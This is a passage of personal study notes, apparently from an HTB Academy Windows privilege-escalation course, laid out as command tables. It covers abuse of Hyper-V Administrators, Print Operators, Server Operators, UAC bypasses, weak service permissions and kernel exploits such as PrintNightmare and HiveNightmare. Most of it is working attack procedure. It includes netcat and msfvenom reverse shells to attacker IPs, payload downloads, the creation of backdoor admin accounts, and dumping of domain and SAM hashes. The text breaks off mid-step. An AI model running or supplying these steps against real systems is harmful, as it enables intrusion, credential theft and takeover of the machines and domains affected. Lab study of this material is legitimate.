|------|---------|--------------|
| 1. Import | `Import-Module .\Inveigh.ps1` | Load the module |
| 2. Run | `Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y` | Start poisoning + print hashes live |
| 3. Read hashes | (shown on screen) or `Get-Inveigh` | Capture NTLM hashes as they come in |

## C# version (Inveigh.exe) — newer, preferred
| Step | Command | What it does |
|------|---------|--------------|
| 1. Run | `.\Inveigh.exe` | Starts with sane defaults (LLMNR/NBNS/mDNS on) |
| 2. Controls | press `ESC` | Toggle the interactive console |
| 3. Help | `.\Inveigh.exe -?` | List all options |

**Common flags:** `-LLMNR Y` `-NBNS Y` `-mDNS Y` = which spoofers to enable ·
`-ConsoleOutput Y` = print live · `-FileOutput Y` = save hashes to a file.


---
---

# Section 13 - Hyper-V Administrators 

The **Hyper-V Administrators** group has **full control over virtual machines**. If important servers (like a **Domain Controller**) are **virtualized**, whoever controls Hyper-V basically controls those servers → treat them as **Domain Admins**.

**Two ways to abuse it — which one to use?**

| Way | Idea | Use when |
|-----|------|----------|
| **A. Clone the DC** | Copy the virtual DC, mount its disk offline → grab **NTDS.dit** → all domain hashes | **A virtual DC exists** on this Hyper-V host (`Get-VM` shows a DC). **Preferred — clean + reliable.** |
| **B. Hard-link trick** | Abuse how Hyper-V restores file permissions **as SYSTEM** to take over a protected SYSTEM file → run code as SYSTEM | **No DC VM to clone** (e.g. just a member server), AND the box is **unpatched** (pre-March 2020) or has a user-startable SYSTEM service like Mozilla's |

**Simple rule:** `Get-VM` first.
- See a **DC** → use **Way A** (clone it, steal NTDS.dit).
- **No DC / member server only** → try **Way B** (hard-link → SYSTEM), but only works on **old/unpatched** boxes.

---

## Way A — Clone the DC, steal NTDS.dit (simple + clean)

| # | Command | What it does |
|---|---------|--------------|
| 1 | `Get-VM` | List the VMs; find the Domain Controller's name |
| 2 | `Export-VM -Name "DC01" -Path C:\Temp\` | Export (clone) the whole DC VM to a folder |
| 3 | `Get-ChildItem -Recurse C:\Temp\ -Filter *.vhdx` | Find the exported virtual disk (`.vhdx`) |
| 4 | `Mount-VHD -Path "C:\Temp\DC01\...\disk.vhdx" -ReadOnly` | Mount the disk offline → it shows up as a new drive (e.g. `E:`) |
| 5 | `copy E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit` | Copy out **NTDS.dit** (unlocked, because the VM isn't running) |
| 6 | `reg save HKLM\SYSTEM C:\Temp\SYSTEM` | Save the **SYSTEM** hive (needed to decrypt NTDS.dit) |
| 7 | `Dismount-VHD -Path "C:\Temp\DC01\...\disk.vhdx"` | Unmount the disk (clean up) |

Then on your **attack box**, extract the hashes:

```shellsession
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
→ every domain user's NTLM hash. (Same NTDS.dit idea as the Backup Operators note.)

> ⚠️ **NTDS.dit alone is useless** — you must grab the **SYSTEM** hive too (it holds the key to decrypt it).

---

## Way B — Hard-link trick → SYSTEM

**Why it works:** when you **delete a VM**, `vmms.exe` tries to restore file permissions on its `.vhdx` — and does it as **NT AUTHORITY\SYSTEM** without checking who you are. So you make a **hard link** from the `.vhdx` to a **protected SYSTEM file**, and SYSTEM "fixes" the permissions → giving **you full control** of that protected file.

**Target example:** Firefox installs the **Mozilla Maintenance Service** (runs as SYSTEM, startable by normal users):

```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

### Steps
| #   | Command                                                                                  | What it does                                                                                                                          |
| --- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Run the PoC: `hyperv-eop.ps1`                                                            | Find the service, search for exploit, run the PoC! Uses the hard-link trick to **grant you full control** of `maintenanceservice.exe` |
| 2   | `takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"` | Take ownership of that file                                                                                                           |
| 3   | Replace it with your **malicious `maintenanceservice.exe`**                              | Swap in your payload (e.g. reverse shell)                                                                                             |
| 4   | `sc.exe start MozillaMaintenance`                                                        | Start the service → your file runs as **SYSTEM**                                                                                      |

PoC: https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

Needs **CVE-2018-0952 / CVE-2019-0841** (or a SYSTEM service like Mozilla's that normal users can start).  ⚠️ **Patched** by the **March 2020** Windows updates (changed hard-link behaviour).

---
---

# Section 14 - Print Operators (SeLoadDriverPrivilege) 

The **Print Operators** group grants **SeLoadDriverPrivilege** = the right to **load device drivers**. Drivers run in the **kernel** (highest level), so you load a **vulnerable driver** (`Capcom.sys`) that lets any user run code as **SYSTEM**. You also get manage printers on a DC, log in locally to a DC, and shut it down. ⚠️ **Patched since Windows 10 1803** — the trick (referencing driver keys under `HKEY_CURRENT_USER`) no longer works on newer builds.

## Setup — get the privilege showing

```cmd
whoami /priv
whoami /groups
```

**If SeLoadDriverPrivilege is NOT listed, check `whoami /groups`:**

| Situation | Why it's missing | Fix |
|-----------|------------------|-----|
| You **ARE** in Print Operators, but the privilege isn't in `whoami /priv` | **UAC** gives a "filtered token" that **hides** your powerful privileges in a normal shell | **Bypass UAC** → run elevated → it appears |
| You are **NOT** in Print Operators (or any group granting it) | You genuinely **don't have it** | Nothing helps — move on |

**Why UAC hides it:** admin-level users get a weaker "filtered token" in a normal shell. The privilege is still yours — UAC just hides it until you run **elevated**. (Compare `whoami /priv` in a normal vs admin shell — the admin one shows more.) **Not the same as "needs a fresh logon":** there the privilege wasn't granted at all. Here it **was** granted (via Print Operators), UAC is just filtering it out.

**Bypass UAC** by opening an elevated shell (enter the Print Operators account's creds), or use **UACMe**. After that, SeLoadDriverPrivilege shows as **Disabled** — fine, we enable it next.

---

## Manual steps


| #   | Command                                                      | What it does                                                                           |
| --- | ------------------------------------------------------------ | -------------------------------------------------------------------------------------- |
| 1   | Edit + compile `EnableSeLoadDriverPrivilege.cpp` (see below) | Builds a tool that **enables the privilege + loads the driver** (download from github) |

**What to download for the manual steps:**

|File|Link|Why|
|---|---|---|
|`EnableSeLoadDriverPrivilege.cpp`|github.com/3gstudent/Homework-of-C-Language|Enables the privilege + loads the driver (compile it)|
|`Capcom.sys`|github.com/FuzzySecurity/Capcom-Rootkit → Driver/Capcom.sys|The vulnerable driver you load|
|`ExploitCapcom` (source)|github.com/tandasat/ExploitCapcom|Exploits Capcom.sys → SYSTEM shell (compile it)|
|`DriverView.exe`|nirsoft.net/utils/driverview.html|Check if Capcom is loaded|

So: **2 things to compile** (`EnableSeLoadDriverPrivilege`, `ExploitCapcom`) + **2 ready files** (`Capcom.sys`, `DriverView.exe`). **Linux exploits must match the target's exact system, so you usually build them on the target — but Windows `.exe` files work anywhere, so you can build them on your own machine and just copy them over.**

**How to do step 1 (edit + compile):**

1. **Edit** — open the `.cpp` in Notepad, make sure the top has these includes (paste over the existing block):

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

2. **Compile** — open **"Developer Command Prompt for VS 2019"** (that's where `cl.exe` lives), `cd` to the folder, then:

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

→ produces `EnableSeLoadDriverPrivilege.exe`. (`/DUNICODE /D_UNICODE` = build in Unicode mode.) ⚠️ `cl.exe` only exists if **Visual Studio (C++ tools)** is installed. If not, compile on **another Windows box with VS**, then copy the `.exe` over. Same goes for `ExploitCapcom.exe`.

**Is ExploitCapcom.exe compiled the same way?** Almost — **same idea (compile from source), but slightly different method:**  For `ExploitCapcom` ---> A **Visual Studio project** → open it in VS → click **Build**. 

| #   | Command                                                                                            | What it does                                                 |
| --- | -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| 2   | Download `Capcom.sys` to `C:\Tools\`                                                               | The vulnerable driver we'll abuse                            |
| 3   | `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"` | Point a registry key at the driver (`\??\` = NT object path) |
| 4   | `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`                           | Mark it as a driver entry                                    |
| 5   | `.\DriverView.exe /stext drivers.txt` then `cat drivers.txt \| Select-String Capcom`               | Check Capcom is **NOT** loaded yet                           |
| 6   | `EnableSeLoadDriverPrivilege.exe`                                                                  | Enables SeLoadDriverPrivilege + loads Capcom.sys             |
| 7   | Re-run DriverView                                                                                  | Confirm **Capcom.sys is now loaded**                         |
| 8   | `.\ExploitCapcom.exe`                                                                              | Exploits the driver → **launches a SYSTEM shell**            |

---

## Faster way — automate with EoPLoadDriver

Does steps 3–6 in one command (enable privilege + make the key + load the driver):

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
Then run the exploit:

```cmd
ExploitCapcom.exe
```

→ SYSTEM shell.

---

## No GUI? (only a shell / reverse shell)


`ExploitCapcom` normally opens a cmd window — useless without a GUI. Run steps 1 through 7 exactly the same, and only step 8 changes — you pre-edit/compile ExploitCapcom to launch your reverse shell, set up a listener, then run it. 

Edit the source before compiling:

- In `ExploitCapcom.cpp` **line 292**, change:

  ```c
  TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
  ```
  to your payload:

  ```c
  TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
  ```
- Make `revshell.exe` with msfvenom, start a listener, then run `ExploitCapcom.exe` → **reverse shell as SYSTEM**. (Use a bind/add-user payload if reverse is blocked.)

## Clean up

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```



---
---

# Section 15 - Server Operators 

**Server Operators** is a powerful group — members can manage Windows servers (even **Domain Controllers**) without being a Domain Admin. It gives you two useful things: **SeBackup + SeRestore** privileges, and **full control over the computer's services**. The trick works like this: a service is just a background program, and many of them run as **SYSTEM** (the highest account). Because Server Operators can edit any service — including the **command it runs** (its "binary path") — you pick a SYSTEM service, change its command to **your own command**, and start it. When it starts, your command runs as **SYSTEM**. The easiest command to use is one that **adds you to the local Administrators group**, which then gives you full control of the box (the DC). The example service we abuse here is **`AppReadiness`** (it runs as SYSTEM).


## Steps

| #   | Command                                                                                                                | What it does                                                                                                                                |
| --- | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | `Get-CimInstance win32_service \| where {$_.StartName -eq "LocalSystem"} \| select Name, State, StartMode \| ft -auto` | Pick a service that runs as LocalSystem, is Stopped, and has StartMode = Auto or Manual (not Disabled) — that one you can start right away. |
| 2   | `sc.exe qc AppReadiness`                                                                                               | Confirm your chosen service runs as **SYSTEM** (LocalSystem)                                                                                |
| 3   | `c:\Tools\PsService.exe security AppReadiness`                                                                         | Check you can control it — look for **Server Operators = All** (full control)                                                               |
| 4   | `net localgroup Administrators`                                                                                        | See who's in local Admins (confirm you're **not** in yet)                                                                                   |
| 5   | `sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`                           | **Change the service's command** → it will add your user (`server_adm`) to Administrators                                                   |
| 6   | `sc.exe start AppReadiness`                                                                                            | Start it → your command runs as SYSTEM. **The start "fails" (error 1053) — that's normal**, the command still ran                           |
| 7   | `net localgroup Administrators`                                                                                        | Confirm your user is **now in Administrators**, the logoff and login again to access.                                                       |

 Note the **space** in `binPath= "..."` — the space after `=` is required by `sc`. The start fails because your command isn't a real service, but it executes **before** failing — so you still win.

---

## Step 5 — what to put in binPath (pick ONE)

Whatever you put in `binPath` runs as **SYSTEM** when the service starts. Two routes:

**Route 1 — add yourself to admins (simplest):**

|Goal|binPath command|
|---|---|
|Add your user to admins|`"cmd /c net localgroup Administrators server_adm /add"`|
|Add a brand-new admin user|`"cmd /c net user hacker Pass123! /add && net localgroup Administrators hacker /add"`|

→ then continue to **"Next (Route 1)"** below to dump hashes.

**Route 2 — get a SYSTEM shell (no GUI / interactive):**

|Goal|binPath command|
|---|---|
|Reverse shell (nc) — `nc -lnvp 443` on your box first|`"C:\Tools\nc.exe -e cmd.exe <YOUR_IP> 443"`|
|Run a payload exe (msfvenom)|`"C:\Tools\revshell.exe"`|

→ you land a **SYSTEM shell** on your listener — you're already root, grab flags/creds directly.

**Which?** Route 1 (add-to-admins) = simplest/most reliable. Route 2 (shell) = when you have **no GUI** or want an interactive session.

## Next (Route 1) — you're local admin on the DC → dump hashes

Now you have full control of the Domain Controller. From your **attack box**:

```shellsession
# confirm admin access (Pwn3d!)
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

# dump a user's hash straight from the DC
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
→ gives the Administrator NTLM hash → **pass-the-hash** or crack it.



---

## Two ways in (Server Operators gives both)

| Way | How |
|-----|-----|
| **A. Service hijack** (shown above) | Full control of services → change a SYSTEM service's binPath → add yourself to Administrators |
| **B. SeBackup/SeRestore** | Same NTDS.dit attack as **Backup Operators**: `diskshadow` → copy `ntds.dit` + `SYSTEM` → `secretsdump` |

**Rule:** either works. Service hijack is quick; if services are locked down, fall back to the SeBackup/SeRestore NTDS.dit route.


## Clean up (important!)

Changing `binPath` **breaks the service**. Restore it after so you don't leave the box damaged:

```cmd
sc config AppReadiness binPath= "C:\Windows\system32\svchost.exe -k AppReadiness -p"
```

(Check the original path first with `sc.exe qc AppReadiness` and save it before you change it.)

---
---

# Section 16 - User Account Control (UAC) Bypass 

**When to use:** “Am I in the admins group but my whoami /priv looks weak?” → yes to both = bypass UAC.

**UAC (User Account Control)** = When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is the "do you want to allow this app to make changes?" prompt. Even if you're an **admin**, you get **two tokens** when you log in:

- a **filtered (medium)** token for normal use → what your shell usually runs as
- a **full (high)** admin token → only used when you click "Yes" on the UAC prompt

**Problem:** on a command-line shell there's **no way to click "Yes"**. So if you're an admin but your shell has the **filtered token**, you must **bypass UAC** to get the **full admin token**. UAC is a **convenience feature, not a security boundary** — so bypasses are expected. This example uses a **DLL hijack** against an **auto-elevating** Windows binary.


## Step 1 — Confirm the situation

| Command                                                                                                   | What you're checking                                                               |
| --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `net localgroup administrators`                                                                           | Confirm your user **IS** an admin (e.g. `sarah` is listed)                         |
| `whoami /priv`                                                                                            | But shows **very few privileges** = you're on the **filtered token** → need bypass |
| `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`                  | UAC on? `0x1` = enabled                                                            |
| `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` | UAC level. `0x5` = "Always notify" (highest, fewer bypasses)                       |
| `[environment]::OSVersion.Version`                                                                        | Windows **build number** → pick a matching bypass                                  |

Match the build number to a technique in the **UACME** project (lists which bypass works on which build). Example here: **technique #54**, works from build **14393**.

### Quick shortcut to UAC Bypass after verifying you as admin

```shell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f

fodhelper.exe          # Built in tools
```

- **`0x5` (Always notify, highest)** → **fodhelper WON’T work** → use the **module’s SystemPropertiesAdvanced DLL-hijack**.
- **Lower than `0x5`** → **fodhelper works** (quick registry trick, no files).


## Step 2 — The bypass (DLL hijack on SystemPropertiesAdvanced.exe)

**Why it works:** the 32-bit `SystemPropertiesAdvanced.exe` **auto-elevates** (no prompt) and tries to load a DLL called **`srrstr.dll`** that **doesn't exist**. Windows searches folders in order, and one of them — **`WindowsApps`** inside your profile — is **writable by you** and in your PATH. So you drop a **malicious `srrstr.dll`** there → it gets loaded **elevated**.

Check PATH to confirm the writable folder is there:

```cmd
cmd /c echo %PATH%
# look for: C:\Users\<you>\AppData\Local\Microsoft\WindowsApps
```

### Steps

| # | Where | Command | What it does |
|---|-------|---------|--------------|
| 1 | Attack box | `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll` | Make a reverse-shell DLL named **srrstr.dll** |
| 2 | Attack box | `sudo python3 -m http.server 8080` | Host the DLL |
| 3 | Target | `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"` | Drop the DLL into the writable PATH folder |
| 4 | Attack box | `nc -lvnp 8443` | Start your listener |
| 5 | Target | `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe` | Run the **32-bit** auto-elevating binary → it loads your DLL **elevated** |

You get a reverse shell with the **FULL admin token** — `whoami /priv` now shows **all the privileges** (SeDebug, SeBackup, SeImpersonate, etc.). `SysWOW64` = the **32-bit** version (the 64-bit one in `System32` won't work for this technique).

---

## Optional — test first with rundll32

To check your DLL runs at all (this gives **normal** rights, not elevated — just a test):

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Before running the real bypass, **kill leftover rundll32 processes** or it may not fire:

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```




---
---

# Section 17 - Weak Permissions (Service/Registry) 

Services usually run as **SYSTEM**. If a service (or its files/registry keys) has **weak permissions** that let a normal user change it, you make it run **your command as SYSTEM**. Common in **third-party / small-vendor / custom** software.

> **Fast find:** run **SharpUp** (`.\SharpUp.exe audit`) or WinPEAS → it lists all the weak spots below. Then exploit manually.

### Tool — find everything fast

```powershell
.\SharpUp.exe audit
```

Audits for common Windows privesc (modifiable services, weak binaries, unquoted paths, etc.). **Run this first**, then exploit what it finds manually with the types below.

**5 types of weak permission (each below):**

| Type                                           | You can…                           | Fix it by…                                |
| ---------------------------------------------- | ---------------------------------- | ----------------------------------------- |
| 1. Weak file ACL (Modifiable Service Binaries) | Overwrite the service **.exe**     | Replace the binary                        |
| 2. Weak service ACL                            | Change the service's **binPath**   | Point binPath at your command             |
| 3. Unquoted service path                       | Drop an .exe in a path gap         | Rarely exploitable (needs admin to write) |
| 4. Weak registry ACL                           | Change the service's **ImagePath** | Set ImagePath to your command             |
| 5. Modifiable autorun                          | Overwrite a **startup** binary     | Runs when that user logs in               |

---

## Type 1 — Weak File ACL (overwrite the .exe) (Modifiable Service Binaries)

**What it is:** a service runs a program (its `.exe`), and that **.exe file** has bad permissions — a normal user can **write/replace it**. So you swap the real .exe for your own malicious one. Next time the service starts (as SYSTEM), **your .exe runs as SYSTEM**.

**Find:** `SharpUp.exe audit` → look under **"Modifiable Service Binaries"**. **Confirm** you can write the .exe:

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

→ if **Everyone** or **BUILTIN\Users** has `(F)` (full) → you can replace it.

**Exploit:**

1. **Make a malicious exe** (attack box) — reverse shell named like the service binary:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f exe -o SecurityService.exe
```

2. **Host + download it** to the target (attack box runs `python3 -m http.server 8080`):

```
iwr http://10.10.14.3:8080/SecurityService.exe -o C:\Temp\SecurityService.exe
```

3. **Back up the original, then overwrite it** (on target):

```
cmd /c copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" 

C:\Temp\SecurityService.exe.bak

cmd /c copy /Y C:\Temp\SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

4. **Start your listener** (attack box): `nc -lvnp 443`
5. **Start the service** → your binary runs as SYSTEM:

```
sc start SecurityService
```

→ SYSTEM reverse shell (or swap the payload to add an admin user).

One thing i did wrong here: I ran `sc.exe start SecurityService.exe` → FAILED 1060 “service does not exist” because the **service name** is `SecurityService`, **not** `SecurityService.exe`. The `.exe` is the file; the service name has no extension.


> **Cleanup:** restore the original binary afterwards: `cmd /c copy /Y C:\Temp\SecurityService.exe.bak "C:\Program Files (x86)\PCProtect\SecurityService.exe"`

---

## Type 2 — Weak Service ACL (change binPath) [similar to Server Operators- Section 15]

**What it is:** the **service itself** has bad permissions — a normal user is allowed to **edit its settings**, including the command it runs (`binPath`). So you change binPath to your own command. When the service starts (as SYSTEM), **your command runs as SYSTEM**. _(Same attack as Server Operators — just a different reason you have the access.)_

**Find:** `SharpUp.exe audit` → **"Modifiable Services"** (e.g. `WindscribeService`).
**Confirm** your permissions on the service:

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

→ if **Authenticated Users** has **SERVICE_ALL_ACCESS** → full control.

**Exploit:** point binPath at your command, stop + start:

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

sc stop WindscribeService

sc start WindscribeService
```
→ start "fails" (1053) but your command ran. Check: `net localgroup administrators`.

> **Cleanup:** put the real binPath back + restart:
> ```cmd
> sc config WindscribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
> sc start WindscribeService
> ```

---

## Type 3 — Unquoted Service Path


**The idea:** a service path with **spaces and no quotes**, e.g.
`C:\Program Files (x86)\System Explorer\service\...exe`

Windows tries each gap in order: `C:\Program.exe`, `C:\Program Files (x86)\System.exe`, etc. Drop your exe in one of those spots → it runs instead.

**Find them:**

```cmd

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Check the service:** `sc qc <ServiceName>` (confirm unquoted path + runs as LocalSystem). ⚠️ **Usually NOT exploitable** — writing to `C:\` or `Program Files` needs admin, and you often can't restart the service anyway. Note it, but don't rely on it.

---

## Type 4 — Weak Registry ACL (change ImagePath)

Every service’s settings are stored in the **registry**, under: `HKLM\System\CurrentControlSet\services\<ServiceName>`

One of those settings is **`ImagePath`** = **the program/command the service runs**. (It’s the _same thing_ as `binPath` — `sc config binpath=` just edits this registry value for you.)

**Normally** only admins can edit these registry keys. **But sometimes** a service’s registry key is misconfigured so a **normal user can write to it.** If you can write to the key, you **change `ImagePath` to your own command** → when the service runs (as SYSTEM), it runs **your** command.

**Find weak service keys in the registry:**

```cmd

accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

→ look for `KEY_ALL_ACCESS` / write on a service key (e.g. `ModelManagerService`).

**Exploit:** change the **ImagePath** (the service's command) to your reverse shell:

```powershell

Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Then start the service (or wait for restart) → runs as SYSTEM.

---

## Type 5 — Modifiable Autorun Binary

**The idea:** programs that **run at startup/login**. If you can **overwrite** one of those binaries (or its registry entry), your code runs **next time that user logs in**.

**Find startup programs:**

```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

**Check if a listed binary is writable by you:**

```
icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"
```

→ look for **your user or a group you're in** (`BUILTIN\Users`, `Everyone`, `Authenticated Users`) with **`F`, `M`, or `W`**. If yes → replace it with your payload → runs when that user logs in.

**What the icacls letters mean:**

|Letter|Means|Writable?|
|---|---|---|
|`F`|Full control|✅ yes|
|`M`|Modify|✅ yes|
|`W`|Write|✅ yes|
|`RX`|Read & execute|❌ no|
|`R`|Read only|❌ no|

---
---

# Section 18 - Windows Kernel Exploits & Missing Patches 

If a Windows box is **missing security patches**, a known **kernel/OS exploit** can take you to **SYSTEM**. Older Windows (XP → Server 2012R2) has tons; Win10/Server 2016+ has fewer but still some. **Always check the patch level first.** ⚠️ Kernel exploits can **crash the box** — try them **after** safer vectors (privileges, services, creds). In the exam, treat as a strong option but know the risk.


## Step 1 — Find missing patches

|Command|What it shows|
|---|---|
|`systeminfo`|OS version, build, and installed **hotfixes (KBs)**|
|`wmic qfe list brief`|List of installed patches (KB numbers + dates)|
|`Get-Hotfix`|Same, in PowerShell|

Look at the **top (latest) KB**, then Google it or search [https://catalog.update.microsoft.com](https://catalog.update.microsoft.com/) for its **release date**. **Old date = box is far behind = likely exploitable.** (You rarely do this by hand — **wesng** does the KB-matching for you.).

### Tools to find the right exploit (automate the matching)

| Tool                                     | Where it runs            | How                                                                                         |
| ---------------------------------------- | ------------------------ | ------------------------------------------------------------------------------------------- |
| **wesng** (Windows Exploit Suggester NG) | your attack box          | save target's `systeminfo` to a file → `python wes.py systeminfo.txt` → lists matching CVEs |
| **Metasploit local_exploit_suggester**   | in a Meterpreter session | `run post/multi/recon/local_exploit_suggester` → auto-suggests kernel exploits              |
| **Watson**                               | on target                | `.exe` that checks the build + patches for known privesc                                    |
| **WinPEAS / Sherlock**                   | on target                | general enum; also flags missing-patch exploits                                             |

**Easiest flow:** run `systeminfo` on target → copy it to your box → `wes.py systeminfo.txt` → pick a CVE it lists.

## Notable exploits (quick reference)

|Exploit|What it is|Note|
|---|---|---|
|**MS08-067**|RCE in "Server" service (SMB) → SYSTEM|Legacy, still seen in old orgs (medical). Can use locally via port-forward|
|**MS17-010 (EternalBlue)**|RCE in SMBv1 → SYSTEM|Classic. Works as privesc too if port 445 is firewalled (forward it)|
|**ALPC Task Scheduler**|Hard-link trick via Task Scheduler → SYSTEM|DLL hijack through the Spooler|
|**HiveNightmare (CVE-2021-36934)**|Any user can read SAM/SYSTEM/SECURITY|→ dump local hashes (see below)|
|**PrintNightmare (CVE-2021-1675/34527)**|Any user adds a print driver → SYSTEM|→ add local admin (see below)|

> **RCE used as privesc:** if an SMB exploit (MS08-067/MS17-010) is blocked from outside (port 445 firewalled), **port-forward 445** to your attack box and run it → SYSTEM. **Easiest way to run the classics:** MS08-067 and MS17-010 (EternalBlue) are **built into Metasploit** — search `ms17_010` / `ms08_067`. Standalone scripts (e.g. AutoBlue for EternalBlue) exist for no-MSF situations.

---

## Exploit A — HiveNightmare (CVE-2021-36934): read SAM as a normal user

**Idea:** a Win10 bug lets **any user read the SAM/SYSTEM/SECURITY** registry hives → dump local password hashes (incl. local admin).

**1. Check if vulnerable** — can normal users read SAM?

```
icacls c:\Windows\System32\config\SAM
```

→ if **`BUILTIN\Users:(I)(RX)`** shows → **vulnerable**. (Also needs a shadow copy to exist — usually on by default.)

**2. Dump the hives** with the PoC:

```
.\HiveNightmare.exe
```

→ writes `SAM-...`, `SYSTEM-...`, `SECURITY-...` to the current folder.

**3. Extract hashes** (on attack box):

```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

→ local hashes (incl. Administrator) → **pass-the-hash** or crack.

---

## Exploit B — PrintNightmare (CVE-2021-1675/34527): add local admin

**Idea:** any authenticated user can add a print driver → runs as SYSTEM → add yourself as admin.

**1. Check the Spooler is running (The Print Spooler is the Windows service that manages printing):**

```
ls \\localhost\pipe\spoolss
```

→ lists `spoolss` = Spooler is on (vulnerable). "path does not exist" = not running.

**2. Allow the script to run, then exploit:**

```
Set-ExecutionPolicy Bypass -Scope Process

Import-Module .\CVE-2021-1675.ps1

Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

→ adds a new **local admin** `hacker`. (Or supply a custom DLL for a reverse shell instead.)

**3. Confirm:**

```
net user hacker
```

→ should show `*Administrators`.

> ⚠️ Adding a user is **noisy** — check it's in scope before doing it on a real engagement.

---

## Exploit C — CVE-2020-0668 (file-move → SYSTEM via Mozilla Maintenance Service)


A Windows **Service Tracing** bug lets you make **SYSTEM move a file you choose** to a place you choose. The move also **changes that file's owner to you**. So you aim the move at a **SYSTEM service's binary** — afterwards you **own** it, replace it with your payload, and start the service → **SYSTEM**. Needs `whoami /priv` to be weak (normal user). You also need the compiled exploit `CVE-2020-0668.exe` (build the Visual Studio project → gives `CVE-2020-0668.exe` + `NtApiDotNet.dll`). 

**Building the exploit (it's a Visual Studio C# project, like ExploitCapcom):**

1. Download the CVE-2020-0668 source to a Windows box with **Visual Studio**.
2. Open the **`.sln`** → VS restores the **NtApiDotNet** NuGet package (if not: right-click solution → _Restore NuGet Packages_).
3. Set **Release** + **x64** → **Build → Build Solution** (`Ctrl+Shift+B`).
4. Output in `bin\Release\`: **`CVE-2020-0668.exe`** + **`NtApiDotNet.dll`** (+ .config/.xml).

> ⚠️ **Copy BOTH `CVE-2020-0668.exe` AND `NtApiDotNet.dll`** to the target — the exe won't run without the DLL beside it. Build once on your own VS machine, then transfer (Windows exes are portable — just match x64/x86). Some repos also have a pre-built one in **Releases**, but building it yourself is safer.

### Step 0 — Find a target service binary

You need a service that **runs as SYSTEM**, is **startable by you**, and whose **.exe is in Program Files** (a third-party file, NOT a protected `C:\Windows` file — the exploit can't overwrite protected Windows files).

```
Get-CimInstance win32_service | where {$_.StartName -eq "LocalSystem"} | select Name, PathName, StartMode | ft -auto
```

Ignore anything under `C:\Windows`. The leftover third-party ones are candidates — the classic is **Mozilla Maintenance Service** (`maintenanceservice.exe`, SYSTEM, user-startable).

### Step 1 — Confirm you can't write it yet

```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

→ `BUILTIN\Users:(I)(RX)` = read-only to you (the exploit will fix this).

### Step 2 — Make the payload (attack box) + download TWO copies

Needs **two copies** because the exploit **corrupts** the one it moves — you keep a clean spare.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

python3 -m http.server 8080
```

On the target:

```
wget http://10.10.14.3:8080/maintenanceservice.exe -O maintenanceservice.exe

wget http://10.10.14.3:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

### Step 3 — Run the exploit (source → destination)

```
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

→ moves your file over the service binary AND makes **you the owner**. Confirm:

